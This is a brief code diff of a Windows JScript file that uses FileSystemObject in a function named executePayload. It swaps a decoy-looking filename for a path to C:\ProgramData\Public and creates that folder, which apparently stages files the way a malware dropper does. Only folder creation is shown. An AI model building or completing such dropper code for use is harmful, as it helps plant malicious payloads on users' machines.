@@ -9,7 +9,7 @@ fileSystem = new ActiveXObject("Scripting.FileSystemObject");
 
 function executePayload() {
    
-    var fileName = "Tesla.QLED.02582.1336.595";
+   var programDataPath = "C:\\ProgramData\\Public";
 
     try {
         fileSystem.CreateFolder(programDataPath);
